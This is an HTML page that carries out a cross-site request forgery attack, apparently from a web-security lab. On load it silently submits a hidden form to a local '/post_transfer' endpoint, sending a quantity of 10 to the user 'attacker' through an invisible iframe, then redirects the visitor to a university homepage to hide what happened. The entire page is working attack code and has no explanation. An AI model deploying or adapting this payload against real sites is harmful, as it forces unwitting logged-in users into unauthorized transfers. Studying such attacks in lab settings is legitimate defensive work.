<!DOCTYPE html>
<html>
    <head>
        <meta charset='utf-8'>
        <script>
            var done=false;
            function attack(){
                document.getElementById('attack').submit();
                done=true;
            }
            function redirect(){
                if(done){
                    window.location.replace("https://ustc.edu.cn");
                }
            }
        </script>
    </head>
    <body onload="attack()">
        <form id="attack" method="POST" target="iframe" action="http://localhost:3000/post_transfer">
            <input name="destination_username" type="hidden" value="attacker">
            <input name="quantity" type="hidden" value="10">
        </form>
        <iframe style="width:0; height:0; border:0; border:none" name="iframe" onload="redirect()"></iframe>
    </body>
</html>
